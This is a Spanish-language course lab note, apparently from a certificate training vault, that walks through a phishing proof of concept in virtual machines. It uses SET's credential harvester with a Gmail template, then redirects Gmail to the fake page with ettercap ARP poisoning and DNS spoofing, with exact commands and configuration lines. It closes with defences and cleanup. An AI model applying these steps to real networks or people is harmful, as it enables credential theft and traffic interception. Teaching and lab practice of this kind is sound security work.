---
title: "📖 Práctica: Ingeniería Social y Campañas de Phishing"
aliases:
  - Ingeniería Social y Campañas de Phishing
  - PoC ingenieria-social
tags:
  - ifct0109/pocs
  - conceptos-fundamentales
  - ingenieria-social
  - phishing
  - osint
---

# 📖 Práctica: Ingeniería Social y Campañas de Phishing

> [!abstract] Resumen del Laboratorio
> Módulo de Conceptos Fundamentales del Certificado IFCT0109: análisis de mecanismos base de redes, inspección de protocolos, desarrollo de pruebas de concepto e interactividad con herramientas de diagnóstico y auditoría técnica.

---

# 🎣 Ataque de Phishing con SET

## 📖 ENUNCIADO (DESCRIPCIÓN)

Vamos a realizar una Prueba de Concepto de Phishing utilizando el framework SET (Social-Engineer Toolkit) incluido en Kali Linux.

> [!warning] ⚠️ ADVERTENCIA LEGAL
>        Este ataque SOLO debe realizarse en entornos controlados de laboratorio con fines educativos. Realizar phishing sin autorización explícita es ILEGAL y puede conllevar consecuencias penales graves.
>         Solo en tu laboratorio. Solo con tus máquinas virtuales.

## 📚 CONCEPTOS PREVIOS

### 🎣 ¿Qué es el Phishing?

El **phishing** es una técnica de ingeniería social que busca engañar a las víctimas para que revelen información confidencial (contraseñas, tarjetas de crédito, etc.) mediante la suplantación de identidad de entidades legítimas.

#### 💡 Elementos de un ataque de Phishing:

* Sitio web falso que imita uno legítimo (Gmail, banco, redes sociales)

* Mensaje convincente (email, SMS, mensaje) que motiva a la víctima

* Captura de credenciales cuando el usuario intenta iniciar sesión

* Redirección al sitio real para evitar sospechas

### 🛠️ ¿Qué es SET (Social-Engineer Toolkit)?

SET es un framework de código abierto diseñado para pruebas de penetración centradas en ataques de ingeniería social. Incluye múltiples vectores de ataque, siendo los más comunes:

* ✅ Credential Harvester - Captura de credenciales mediante sitios clonados

* ✅ Website Attack Vectors - Ataques basados en sitios web maliciosos

* ✅ Spear-Phishing - Phishing dirigido con emails personalizados

* ✅ Mass Mailer - Envío masivo de emails de phishing

## 🖥️ Configuración del Entorno

### 📋 Requisitos

* 🐉 Máquina virtual con Kali Linux (atacante)

* 💻 Máquina virtual con Windows 7 (víctima)

* 🌐 Ambas máquinas en la misma red

### 📊 Configuración de Red (según imágenes)

| Elemento | Dirección IP |
| --- | --- |
| Router (Puerta de enlace) | 10.0.0.1 |
| Kali Linux (Atacante) | 10.0.0.6 |
| Windows 7 (Víctima) | 10.0.0.12 |

> [!warning] 📝 Importante:  Anota las IPs reales de tu entorno, ya que pueden variar.

## 🚀 Prueba de Concepto (PoC)

La propia Kali Linux tiene utilidades para llevar a cabo ataques por ingeniería social. El framework más conocido es SET o `setoolkit`.

## 🎯 Parte 1: Credential Harvester Attack Method

### 🔧 Paso 1: Iniciar SET

#### 🐉 En Kali Linux:

```bash
sudo setoolkit
```

Aparecerá el menú principal de SET:

### 📋 Paso 2: Social-Engineering Attacks

Vamos al menú **1) Social-Engineering Attacks** y entraríamos en el siguiente menú.

```bash
1
```

### 🌐 Paso 3: Website Attack Vectors

Vamos ahora a **2) Website Attack Vectors**

```bash
2
```

#### 🎯 Tipos de Ataques Disponibles:

**1) Credential Harvester (Recolección de Credenciales):**

* Objetivo: Crear un sitio web falso que capture credenciales

* Uso: Phishing tradicional (robo de contraseñas)

**2) Metasploit Browser Exploit:**

* Objetivo: Crear una web que ejecute un payload malicioso

* Uso: Tomar control remoto del equipo de la víctima

### 🎣 Paso 4: Credential Harvester Method

En un primer concepto, vamos a crear una web clone de Gmail para comprobar el funcionamiento del framework.

Elegimos la opción **3) Credential Harvester Attack Method**

```bash
3
```

### 📝 Paso 5: Seleccionar Método Web Template

A continuación, vamos a elegir una plantilla creada, pero podríamos clonar un sitio existente seleccionando la opción 2.

Elegimos la opción **1) Web Templates**

```bash
1
```

### 🌐 Paso 6: Configurar IP del Servidor Web

Nos pregunta la IP del equipo que hará como servidor web.

#### 🐉 En Kali Linux:

Introduce la IP de Kali (en nuestro caso: `10.0.0.6`)

```bash
10.0.0.6
```

### 📧 Paso 7: Seleccionar Plantilla

Y elegimos una plantilla de Google.

Seleccionamos la opción de **Google** (normalmente opción 2 o 3, dependiendo de la versión).

### ✅ Paso 8: Servidor Web Activo

En la siguiente pantalla pulsamos **Enter**, y generará el servidor web con la plantilla de Gmail y se queda a la espera de conexiones y credenciales.

> [!warning] 🎯 Estado actual:
>
>          ✅ Servidor web corriendo en `http://10.0.0.6`
>          ✅ Capturando credenciales automáticamente
>          ✅ Esperando a que la víctima acceda

### 🌐 Paso 9: Acceder desde la Víctima

#### 💻 En Windows 7 (Víctima):

Abre el navegador y accede a:

```bash
http://10.0.0.6
```

Accedemos al servidor web y veremos cómo ahora hay una web similar a Gmail:

### 🔑 Paso 10: Captura de Credenciales

Sólo hay que introducir credenciales para ver cómo en Kali se reflejan dichas credenciales.

#### 💻 En Windows 7:

Introduce cualquier email y contraseña en el formulario falso de Gmail.

**Ejemplo:**

* Email: `victima@gmail.com`

* Password: `password123`

En Kali verás aparecer las credenciales capturadas:

#### ✅ Resultado:

SET muestra en tiempo real:

* 📧 Email introducido

* 🔑 Contraseña en texto claro

* 🌐 IP de la víctima

* 🕐 Timestamp del acceso

Ya sólo hay que tratar de que alguien entre a la web para que deje sus credenciales.

## 🌐 Parte 2: DNS Spoofing con Ettercap

### 🎯 Objetivo

Para mejorar la prueba vamos a redireccionar el tráfico de modo que cuando la víctima escriba `gmail.com` en el navegador, se redireccione automáticamente a nuestra web trampa.

En este caso vamos a hacer un MITM con **ettercap**.

### 📝 Paso 1: Configurar DNS en Ettercap

Primero tenemos que editar el archivo de configuración de DNS de ettercap.

#### 🐉 En Kali Linux:

```bash
sudo nano /etc/ettercap/etter.dns
```

Y añadimos las DNS para reenviar a nuestra web cuando la víctima entre en Gmail.

Al final del archivo, añade estas líneas:

```bash
# Gmail phishing redirect
gmail.com      A   10.0.0.6
*.gmail.com    A   10.0.0.6
www.gmail.com  A   10.0.0.6
```

#### 📋 Explicación:

* `gmail.com A 10.0.0.6` → Cuando la víctima ponga gmail.com, se resuelve a la IP de Kali

* `*.gmail.com A 10.0.0.6` → Cualquier subdominio de gmail.com también

* `www.gmail.com A 10.0.0.6` → Específicamente www.gmail.com

Guarda el archivo: `Ctrl + O`, luego `Enter`, y sal: `Ctrl + X`

### 🔧 Paso 2: Habilitar IP Forwarding

#### 🐉 En Kali Linux:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
# o
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
```

### ☠️ Paso 3: Iniciar el Ataque MITM con Ettercap

Finalmente comenzamos el ataque MitM con la siguiente línea:

#### 🐉 En Kali Linux:

**Sintaxis:**

```bash
sudo ettercap -T -q -i [INTERFAZ_RED] -M arp:remote -P dns_spoof //[IP_ROUTER]// //[IP_VÍCTIMA]//
```

**En nuestro caso:**

```bash
sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof //10.0.0.1// //10.0.0.12//
```

#### 📋 Explicación de Parámetros:

* `-T` → Modo texto (sin interfaz gráfica)

* `-q` → Modo silencioso (quiet)

* `-i eth0` → Interfaz de red (cambia según tu sistema)

* `-M arp:remote` → Ataque MITM con ARP spoofing

* `-P dns_spoof` → Plugin de DNS spoofing

* `//10.0.0.1//` → IP del router

* `//10.0.0.12//` → IP de la víctima

**⚠️ Importante:** Respetar las barras `//`

**Respetar las barras**

Ettercap comenzará el ataque MITM y DNS spoofing:

### ✅ Paso 4: Verificar el Ataque

#### 💻 En Windows 7 (Víctima):

* Abre el navegador

* Escribe en la barra de direcciones: `gmail.com` o `www.gmail.com`

* Presiona Enter

**Resultado esperado:**

* ✅ El navegador carga la página falsa de Gmail (tu servidor SET)

* ✅ La víctima NO ve la IP `10.0.0.6`, sino el dominio `gmail.com`

* ✅ Parece completamente legítimo (desde la perspectiva de la víctima)

> [!warning] 🎯 Diferencia Clave:
>         SIN DNS Spoofing:  La víctima debe acceder a `http://10.0.0.6` (sospechoso)
>         CON DNS Spoofing:  La víctima accede a `gmail.com` (parece legítimo)
>        Esto aumenta drásticamente la probabilidad de éxito del phishing.

## 🔄 Flujo Completo del Ataque

#### 📊 Secuencia de Eventos:

* Kali ejecuta SET → Servidor web falso en `10.0.0.6`

* Kali ejecuta ettercap → MITM + DNS spoofing activo

* Víctima escribe "gmail.com" en el navegador

* DNS spoofing → Resuelve a `10.0.0.6` en lugar de la IP real de Gmail

* Navegador carga sitio falso → Parece Gmail legítimo

* Víctima introduce credenciales → Email y contraseña

* SET captura las credenciales → Muestra en pantalla de Kali

* Víctima es redirigida → Al Gmail real (opcional, para no levantar sospechas)

## 🛡️ Cómo Protegerse del Phishing

### 🔐 Medidas de Protección

| Medida | Descripción | Efectividad |
| --- | --- | --- |
| Verificar HTTPS | Comprobar el candado verde y certificado SSL | ✅ Alta |
| Revisar URL | Verificar que la URL es exactamente la correcta (no g-mail.com, gmial.com, etc.) | ✅ Alta |
| Autenticación 2FA | Usar autenticación de dos factores | ✅ Muy Alta |
| No hacer clic en enlaces | Escribir manualmente la URL en el navegador | ✅ Alta |
| Antiphishing en navegador | Usar navegadores modernos con protección antiphishing | ⚠️ Media |
| Educación del usuario | Formación en detección de phishing | ✅ Alta (a largo plazo) |
| Verificar remitente | En emails, verificar la dirección del remitente | ✅ Alta |

## 🚨 Señales de Alerta de Phishing

* 🚩 URL sospechosa (errores ortográficos, dominios extraños)

* 🚩 Falta de HTTPS (candado verde)

* 🚩 Diseño pobre o elementos desalineados

* 🚩 Urgencia artificial ("Tu cuenta será cerrada en 24 horas")

* 🚩 Solicitud de información sensible por email

* 🚩 Errores gramaticales u ortográficos

* 🚩 Remitente desconocido o sospechoso

* 🚩 Enlaces que no coinciden con el texto mostrado

## 📚 Conclusiones

### 🎓 Lo que hemos aprendido:

* ✅ SET permite crear sitios de phishing convincentes en minutos

* ✅ DNS spoofing hace el ataque mucho más creíble

* ✅ La combinación MITM + DNS spoofing + Phishing es muy efectiva

* ✅ Las credenciales HTTP se capturan en texto claro

* ✅ HTTPS y verificación de URLs son defensas críticas

* ✅ La ingeniería social explota la confianza del usuario

### ⚠️ Responsabilidad Ética:

Este conocimiento debe usarse ÚNICAMENTE para:

* 🎓 Educación y formación en seguridad

* 🔐 Pruebas de penetración autorizadas

* 🛡️ Concienciación sobre riesgos de phishing

* 📖 Entrenamientos de seguridad corporativa

**NUNCA para actividades ilegales. El phishing no autorizado es un delito grave.**

## 🧹 Limpieza Post-Práctica

### 🛑 Detener los Ataques

#### 🐉 En Kali Linux:

* Detener ettercap: `Ctrl + C`

* Detener SET: `Ctrl + C` y luego escribir `exit`

* Deshabilitar IP forwarding:

```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

* Restaurar archivo DNS de ettercap (opcional):

```bash
sudo nano /etc/ettercap/etter.dns
```

          Eliminar las líneas de Gmail que añadimos.

#### 💻 En Windows 7:

* Limpiar caché DNS:

```cmd
ipconfig /flushdns
```

* Limpiar tabla ARP:

```bash
arp -d
```

* Cerrar y reabrir el navegador

---

## 🔗 Enlaces y Referencias
* 🗂️ [[02 - MODULOS/05 - Prácticas (PoCs)|Catálogo General de Prácticas (PoCs)]]
* 🏠 [[00 - INDICE|Inicio del Vault]]
